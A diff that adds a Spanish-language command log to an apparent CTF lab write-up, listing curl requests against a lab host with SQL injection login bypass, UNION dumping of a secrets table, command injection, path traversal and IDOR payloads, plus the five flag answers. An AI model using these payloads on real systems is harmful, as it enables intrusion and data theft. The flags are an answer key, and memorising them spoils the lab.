@@ -171,3 +171,43 @@ El id en la URL puede seguir existiendo (es útil para navegar), pero el
 servidor tiene que validar, en cada request, que el recurso solicitado
 pertenece a quien está autenticado o que su rol lo autoriza explícitamente.
 
+## 4. Bitácora de comandos
+
+```bash
+# Setup del entorno
+make setup
+./ctf lab 07
+make shell
+
+# Reconocimiento rápido del portal
+curl -s http://phantomcorp/
+
+# R1: SQLi - bypass de autenticacion
+curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin" --data-urlencode "pass=wrongpass"
+curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' -- " --data-urlencode "pass=x"
+
+# R2: SQLi - UNION (primero confirmar cantidad de columnas)
+curl -s -G http://phantomcorp/buscar --data-urlencode "q=Router"
+curl -s -G http://phantomcorp/buscar --data-urlencode "q=Router' ORDER BY 3 -- "
+curl -s -G http://phantomcorp/buscar --data-urlencode "q=' UNION SELECT clave,valor FROM secrets -- "
+
+# R3: Command injection
+curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1"
+curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
+
+# R4: Path traversal / LFI
+curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=catalogo.txt"
+curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"
+
+# R5: IDOR
+curl -s "http://phantomcorp/perfil?id=3"
+curl -s "http://phantomcorp/perfil?id=1"
+
+# Entrega de flags
+./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
+./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+./ctf submit 07 R3 'FLAG{command_injection_rce}'
+./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
+./ctf submit 07 R5 'FLAG{idor_broken_access}'
+./ctf status 07
+```
